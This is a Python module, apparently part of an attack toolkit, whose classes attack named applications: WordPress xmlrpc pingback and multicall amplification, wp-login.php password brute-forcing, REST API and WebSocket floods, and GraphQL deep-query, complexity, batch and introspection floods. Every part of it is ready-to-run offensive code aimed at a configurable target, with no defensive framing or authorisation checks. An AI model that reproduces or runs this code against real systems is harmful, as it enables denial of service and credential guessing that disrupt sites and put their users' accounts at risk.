"""
Application-Specific Attack Module

Implements attacks targeting specific applications:
- WordPress attacks
- API endpoint attacks
- WebSocket attacks
- GraphQL attacks
"""

import asyncio
import aiohttp
import random
import string
import json
import time
import hashlib
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
import logging

logger = logging.getLogger(__name__)


@dataclass
class AppConfig:
    """Application attack configuration"""
    target: str
    port: int = 80
    ssl: bool = False
    duration: int = 60
    connections: int = 50
    rate_limit: int = 100


@dataclass
class AppStats:
    """Application attack statistics"""
    requests_sent: int = 0
    successful: int = 0
    failed: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    start_time: float = field(default_factory=time.time)


class WordPressAttack:
    """
    WordPress-Specific Attacks
    
    Targets WordPress-specific endpoints:
    - xmlrpc.php pingback
    - wp-login.php bruteforce
    - REST API abuse
    """
    
    def __init__(self, config: AppConfig):
        self.config = config
        self.stats = AppStats()
        self._running = False
        
    async def xmlrpc_pingback(self):
        """Exploit xmlrpc.php for amplification"""
        self._running = True
        self.stats = AppStats()
        
        protocol = 'https' if self.config.ssl else 'http'
        url = f"{protocol}://{self.config.target}:{self.config.port}/xmlrpc.php"
        
        logger.info(f"Starting WordPress xmlrpc pingback attack on {url}")
        
        connector = aiohttp.TCPConnector(limit=self.config.connections)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._xmlrpc_worker(session, url))
                tasks.append(task)
                
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.config.duration
                )
            except asyncio.TimeoutError:
                pass
                
        self._running = False
        
    async def xmlrpc_multicall_attack(self):
        """Enhanced XML-RPC attack using system.multicall for amplification"""
        self._running = True
        self.stats = AppStats()
        
        protocol = 'https' if self.config.ssl else 'http'
        url = f"{protocol}://{self.config.target}:{self.config.port}/xmlrpc.php"
        
        logger.info(f"Starting WordPress xmlrpc multicall attack on {url}")
        
        connector = aiohttp.TCPConnector(limit=self.config.connections)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._xmlrpc_multicall_worker(session, url))
                tasks.append(task)
                
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.config.duration
                )
            except asyncio.TimeoutError:
                pass
                
        self._running = False
        
    async def _xmlrpc_multicall_worker(self, session: aiohttp.ClientSession, url: str):
        """XML-RPC multicall worker for amplification"""
        while self._running:
            try:
                # Create multicall payload with many method calls
                calls = []
                for i in range(100):  # 100 calls in one request for amplification
                    calls.append({
                        'methodName': 'pingback.ping',
                        'params': [
                            f'http://attacker{random.randint(1,9999)}.example.com/',
                            f'{url}?p={random.randint(1,1000)}'
                        ]
                    })
                
                payload = f'''<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>'''
                
                for call in calls:
                    payload += f'''
                        <value>
                            <struct>
                                <member>
                                    <name>methodName</name>
                                    <value><string>{call['methodName']}</string></value>
                                </member>
                                <member>
                                    <name>params</name>
                                    <value>
                                        <array>
                                            <data>
                                                <value><string>{call['params'][0]}</string></value>
                                                <value><string>{call['params'][1]}</string></value>
                                            </data>
                                        </array>
                                    </value>
                                </member>
                            </struct>
                        </value>'''
                
                payload += '''
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>'''
                
                async with session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'text/xml'},
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    self.stats.requests_sent += 1
                    self.stats.bytes_sent += len(payload)
                    
                    if response.status == 200:
                        self.stats.successful += 1
                    else:
                        self.stats.failed += 1
                        
            except Exception:
                self.stats.failed += 1
                
            if self.config.rate_limit > 0:
                await asyncio.sleep(1.0 / self.config.rate_limit)
        
    async def _xmlrpc_worker(self, session: aiohttp.ClientSession, url: str):
        """XMLRPC worker"""
        while self._running:
            try:
                # Pingback payload
                payload = f'''<?xml version="1.0"?>
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param><value><string>http://target{random.randint(1,9999)}.example.com/</string></value></param>
        <param><value><string>{url}</string></value></param>
    </params>
</methodCall>'''
                
                async with session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'text/xml'},
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    self.stats.requests_sent += 1
                    self.stats.bytes_sent += len(payload)
                    
                    if response.status == 200:
                        self.stats.successful += 1
                    else:
                        self.stats.failed += 1
                        
            except Exception:
                self.stats.failed += 1
                
            if self.config.rate_limit > 0:
                await asyncio.sleep(1.0 / self.config.rate_limit)
                
    async def login_bruteforce(self, usernames: List[str] = None, passwords: List[str] = None):
        """WordPress login bruteforce"""
        self._running = True
        self.stats = AppStats()
        
        usernames = usernames or ['admin', 'administrator', 'user', 'test']
        passwords = passwords or ['password', '123456', 'admin', 'wordpress']
        
        protocol = 'https' if self.config.ssl else 'http'
        url = f"{protocol}://{self.config.target}:{self.config.port}/wp-login.php"
        
        logger.info(f"Starting WordPress login bruteforce on {url}")
        
        connector = aiohttp.TCPConnector(limit=self.config.connections)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            for username in usernames:
                for password in passwords:
                    if not self._running:
                        return
                        
                    try:
                        data = {
                            'log': username,
                            'pwd': password,
                            'wp-submit': 'Log In',
                            'redirect_to': f"{protocol}://{self.config.target}/wp-admin/",
                            'testcookie': '1'
                        }
                        
                        async with session.post(
                            url,
                            data=data,
                            allow_redirects=False,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            self.stats.requests_sent += 1
                            
                            if response.status == 302:
                                logger.warning(f"Possible valid credentials: {username}:{password}")
                                self.stats.successful += 1
                            else:
                                self.stats.failed += 1
                                
                    except Exception:
                        self.stats.failed += 1
                        
                    await asyncio.sleep(0.5)
                    
        self._running = False
        
    async def stop(self):
        self._running = False
        
    def get_stats(self) -> Dict[str, Any]:
        elapsed = time.time() - self.stats.start_time
        return {
            'requests_sent': self.stats.requests_sent,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'rps': self.stats.requests_sent / elapsed if elapsed > 0 else 0,
        }


class APIFlood:
    """
    API Endpoint Flood
    
    Floods REST API endpoints with requests.
    """
    
    def __init__(self, config: AppConfig, endpoints: List[str] = None):
        self.config = config
        self.endpoints = endpoints or ['/api/v1/users', '/api/v1/data', '/api/v1/search']
        self.stats = AppStats()
        self._running = False
        
    async def start(self):
        """Start API flood"""
        self._running = True
        self.stats = AppStats()
        
        protocol = 'https' if self.config.ssl else 'http'
        base_url = f"{protocol}://{self.config.target}:{self.config.port}"
        
        logger.info(f"Starting API flood on {base_url}")
        
        connector = aiohttp.TCPConnector(limit=self.config.connections)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._worker(session, base_url))
                tasks.append(task)
                
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.config.duration
                )
            except asyncio.TimeoutError:
                pass
                
        self._running = False
        
    async def _worker(self, session: aiohttp.ClientSession, base_url: str):
        """API flood worker"""
        methods = ['GET', 'POST', 'PUT', 'DELETE']
        
        while self._running:
            try:
                endpoint = random.choice(self.endpoints)
                method = random.choice(methods)
                url = base_url + endpoint
                
                # Add random query params
                if random.random() < 0.5:
                    params = '&'.join(f"p{i}={random.randint(1,1000)}" for i in range(random.randint(1, 5)))
                    url += f"?{params}"
                    
                headers = {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-Request-ID': hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
                }
                
                # Random JSON body for POST/PUT
                body = None
                if method in ['POST', 'PUT']:
                    body = json.dumps({
                        'data': ''.join(random.choices(string.ascii_letters, k=100)),
                        'id': random.randint(1, 10000),
                    })
                    
                async with session.request(
                    method,
                    url,
                    headers=headers,
                    data=body,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    self.stats.requests_sent += 1
                    self.stats.bytes_sent += len(body or '')
                    
                    if response.status < 400:
                        self.stats.successful += 1
                    else:
                        self.stats.failed += 1
                        
            except Exception:
                self.stats.failed += 1
                
            if self.config.rate_limit > 0:
                await asyncio.sleep(1.0 / self.config.rate_limit)
                
    async def stop(self):
        self._running = False
        
    def get_stats(self) -> Dict[str, Any]:
        elapsed = time.time() - self.stats.start_time
        return {
            'requests_sent': self.stats.requests_sent,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'rps': self.stats.requests_sent / elapsed if elapsed > 0 else 0,
        }


class WebSocketFlood:
    """
    WebSocket Flood Attack
    
    Floods WebSocket endpoints with messages.
    """
    
    def __init__(self, config: AppConfig, ws_path: str = '/ws'):
        self.config = config
        self.ws_path = ws_path
        self.stats = AppStats()
        self._running = False
        
    async def start(self):
        """Start WebSocket flood"""
        self._running = True
        self.stats = AppStats()
        
        protocol = 'wss' if self.config.ssl else 'ws'
        url = f"{protocol}://{self.config.target}:{self.config.port}{self.ws_path}"
        
        logger.info(f"Starting WebSocket flood on {url}")
        
        tasks = []
        for _ in range(self.config.connections):
            task = asyncio.create_task(self._worker(url))
            tasks.append(task)
            
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
            
        self._running = False
        
    async def _worker(self, url: str):
        """WebSocket flood worker with enhanced message types"""
        import ssl as ssl_module
        
        while self._running:
            try:
                ssl_context = None
                if self.config.ssl:
                    ssl_context = ssl_module.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl_module.CERT_NONE
                    
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(url, ssl=ssl_context) as ws:
                        # Send various types of messages
                        message_count = 0
                        while self._running and message_count < 1000:
                            message_type = random.choice([
                                'text', 'binary', 'ping', 'large_payload', 
                                'json_rpc', 'subscription', 'malformed'
                            ])
                            
                            if message_type == 'text':
                                msg = json.dumps({
                                    'type': 'message',
                                    'payload': ''.join(random.choices(string.ascii_letters, k=random.randint(10, 1000))),
                                    'timestamp': time.time(),
                                })
                                await ws.send_str(msg)
                                
                            elif message_type == 'binary':
                                # Send binary data
                                binary_data = bytes(random.randint(0, 255) for _ in range(random.randint(100, 5000)))
                                await ws.send_bytes(binary_data)
                                
                            elif message_type == 'ping':
                                # Send ping frame
                                await ws.ping()
                                
                            elif message_type == 'large_payload':
                                # Send very large message
                                large_msg = json.dumps({
                                    'type': 'bulk_data',
                                    'payload': ''.join(random.choices(string.ascii_letters, k=50000)),
                                    'timestamp': time.time(),
                                })
                                await ws.send_str(large_msg)
                                
                            elif message_type == 'json_rpc':
                                # JSON-RPC style message
                                rpc_msg = json.dumps({
                                    'jsonrpc': '2.0',
                                    'method': random.choice(['getData', 'updateUser', 'processOrder']),
                                    'params': {'id': random.randint(1, 10000)},
                                    'id': random.randint(1, 999999)
                                })
                                await ws.send_str(rpc_msg)
                                
                            elif message_type == 'subscription':
                                # Subscription message
                                sub_msg = json.dumps({
                                    'type': 'subscribe',
                                    'channel': f'channel_{random.randint(1, 100)}',
                                    'auth_token': f'token_{random.randint(100000, 999999)}'
                                })
                                await ws.send_str(sub_msg)
                                
                            elif message_type == 'malformed':
                                # Malformed JSON to test error handling
                                malformed = '{"incomplete": "json", "missing":'
                                await ws.send_str(malformed)
                            
                            self.stats.requests_sent += 1
                            message_count += 1
                            
                            # Try to receive response
                            try:
                                async with asyncio.timeout(0.1):
                                    response = await ws.receive()
                                    if response.type == aiohttp.WSMsgType.TEXT:
                                        self.stats.successful += 1
                                        self.stats.bytes_received += len(response.data)
                                    elif response.type == aiohttp.WSMsgType.BINARY:
                                        self.stats.successful += 1
                                        self.stats.bytes_received += len(response.data)
                            except asyncio.TimeoutError:
                                pass
                                
                            if self.config.rate_limit > 0:
                                await asyncio.sleep(1.0 / self.config.rate_limit)
                                
            except Exception as e:
                logger.debug(f"WebSocket worker error: {e}")
                self.stats.failed += 1
                await asyncio.sleep(0.5)
                
    async def stop(self):
        self._running = False
        
    def get_stats(self) -> Dict[str, Any]:
        elapsed = time.time() - self.stats.start_time
        return {
            'messages_sent': self.stats.requests_sent,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'mps': self.stats.requests_sent / elapsed if elapsed > 0 else 0,
            'bytes_sent': self.stats.bytes_sent,
        }


class GraphQLAttack:
    """
    GraphQL Attack
    
    Attacks GraphQL endpoints with:
    - Deep query attacks
    - Batch query attacks
    - Introspection abuse
    """
    
    def __init__(self, config: AppConfig, endpoint: str = '/graphql'):
        self.config = config
        self.endpoint = endpoint
        self.stats = AppStats()
        self._running = False
        
    async def deep_query_attack(self, depth: int = 10):
        """Attack with deeply nested queries"""
        self._running = True
        self.stats = AppStats()
        
        protocol = 'https' if self.config.ssl else 'http'
        url = f"{protocol}://{self.config.target}:{self.config.port}{self.endpoint}"
        
        logger.info(f"Starting GraphQL deep query attack on {url}")
        
        connector = aiohttp.TCPConnector(limit=self.config.connections)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._deep_query_worker(session, url, depth))
                tasks.append(task)
                
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.config.duration
                )
            except asyncio.TimeoutError:
                pass
                
        self._running = False
        
    async def _deep_query_worker(self, session: aiohttp.ClientSession, url: str, depth: int):
        """Deep query worker"""
        while self._running:
            try:
                # Build deeply nested query
                query = self._build_deep_query(depth)
                
                payload = json.dumps({'query': query})
                
                async with session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    self.stats.requests_sent += 1
                    self.stats.bytes_sent += len(payload)
                    
                    body = await response.read()
                    self.stats.bytes_received += len(body)
                    
                    if response.status == 200:
                        self.stats.successful += 1
                    else:
                        self.stats.failed += 1
                        
            except Exception:
                self.stats.failed += 1
                
            if self.config.rate_limit > 0:
                await asyncio.sleep(1.0 / self.config.rate_limit)
                
    def _build_deep_query(self, depth: int) -> str:
        """Build deeply nested GraphQL query"""
        query = "{ "
        for i in range(depth):
            query += f"field{i} {{ "
        query += "id name "
        for _ in range(depth):
            query += "} "
        query += "}"
        return query
        
    def _build_complex_query(self, complexity: int) -> str:
        """Build complex GraphQL query with high computational cost"""
        # Create a query with many fields and nested relationships
        query = "{ "
        
        # Add multiple top-level fields
        for i in range(complexity):
            query += f"""
                users{i}: users(first: 1000) {{
                    id
                    name
                    email
                    posts(first: 100) {{
                        id
                        title
                        content
                        comments(first: 50) {{
                            id
                            content
                            author {{
                                id
                                name
                                posts(first: 10) {{
                                    id
                                    title
                                }}
                            }}
                        }}
                    }}
                }}
            """
        
        query += "}"
        return query
        
    async def complexity_attack(self, complexity: int = 20):
        """Attack with high-complexity queries"""
        self._running = True
        self.stats = AppStats()
        
        protocol = 'https' if self.config.ssl else 'http'
        url = f"{protocol}://{self.config.target}:{self.config.port}{self.endpoint}"
        
        logger.info(f"Starting GraphQL complexity attack on {url}")
        
        connector = aiohttp.TCPConnector(limit=self.config.connections)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._complexity_worker(session, url, complexity))
                tasks.append(task)
                
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.config.duration
                )
            except asyncio.TimeoutError:
                pass
                
        self._running = False
        
    async def _complexity_worker(self, session: aiohttp.ClientSession, url: str, complexity: int):
        """Complexity attack worker"""
        while self._running:
            try:
                # Build high-complexity query
                query = self._build_complex_query(complexity)
                
                payload = json.dumps({'query': query})
                
                async with session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as response:
                    self.stats.requests_sent += 1
                    self.stats.bytes_sent += len(payload)
                    
                    body = await response.read()
                    self.stats.bytes_received += len(body)
                    
                    if response.status == 200:
                        self.stats.successful += 1
                    else:
                        self.stats.failed += 1
                        
            except Exception:
                self.stats.failed += 1
                
            if self.config.rate_limit > 0:
                await asyncio.sleep(1.0 / self.config.rate_limit)
        
    async def batch_attack(self, batch_size: int = 100):
        """Attack with batched queries"""
        self._running = True
        self.stats = AppStats()
        
        protocol = 'https' if self.config.ssl else 'http'
        url = f"{protocol}://{self.config.target}:{self.config.port}{self.endpoint}"
        
        logger.info(f"Starting GraphQL batch attack on {url}")
        
        connector = aiohttp.TCPConnector(limit=self.config.connections)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._batch_worker(session, url, batch_size))
                tasks.append(task)
                
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.config.duration
                )
            except asyncio.TimeoutError:
                pass
                
        self._running = False
        
    async def _batch_worker(self, session: aiohttp.ClientSession, url: str, batch_size: int):
        """Batch query worker"""
        while self._running:
            try:
                # Build batch of queries
                queries = []
                for i in range(batch_size):
                    queries.append({
                        'query': f'{{ user(id: {random.randint(1, 10000)}) {{ id name email }} }}'
                    })
                    
                payload = json.dumps(queries)
                
                async with session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as response:
                    self.stats.requests_sent += batch_size
                    self.stats.bytes_sent += len(payload)
                    
                    body = await response.read()
                    self.stats.bytes_received += len(body)
                    
                    if response.status == 200:
                        self.stats.successful += batch_size
                    else:
                        self.stats.failed += batch_size
                        
            except Exception:
                self.stats.failed += batch_size
                
            if self.config.rate_limit > 0:
                await asyncio.sleep(1.0 / self.config.rate_limit)
                
    async def introspection_attack(self):
        """Abuse introspection queries"""
        self._running = True
        self.stats = AppStats()
        
        protocol = 'https' if self.config.ssl else 'http'
        url = f"{protocol}://{self.config.target}:{self.config.port}{self.endpoint}"
        
        logger.info(f"Starting GraphQL introspection attack on {url}")
        
        # Full introspection query
        introspection_query = '''
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types { ...FullType }
                directives { name description locations args { ...InputValue } }
            }
        }
        fragment FullType on __Type {
            kind name description
            fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason }
            inputFields { ...InputValue }
            interfaces { ...TypeRef }
            enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
            possibleTypes { ...TypeRef }
        }
        fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
        fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } }
        '''
        
        connector = aiohttp.TCPConnector(limit=self.config.connections)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._introspection_worker(session, url, introspection_query))
                tasks.append(task)
                
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.config.duration
                )
            except asyncio.TimeoutError:
                pass
                
        self._running = False
        
    async def _introspection_worker(self, session: aiohttp.ClientSession, url: str, query: str):
        """Introspection worker"""
        while self._running:
            try:
                payload = json.dumps({'query': query})
                
                async with session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as response:
                    self.stats.requests_sent += 1
                    self.stats.bytes_sent += len(payload)
                    
                    body = await response.read()
                    self.stats.bytes_received += len(body)
                    
                    if response.status == 200:
                        self.stats.successful += 1
                    else:
                        self.stats.failed += 1
                        
            except Exception:
                self.stats.failed += 1
                
            if self.config.rate_limit > 0:
                await asyncio.sleep(1.0 / self.config.rate_limit)
                
    async def stop(self):
        self._running = False
        
    def get_stats(self) -> Dict[str, Any]:
        elapsed = time.time() - self.stats.start_time
        return {
            'requests_sent': self.stats.requests_sent,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'rps': self.stats.requests_sent / elapsed if elapsed > 0 else 0,
            'bytes_sent': self.stats.bytes_sent,
            'bytes_received': self.stats.bytes_received,
        }
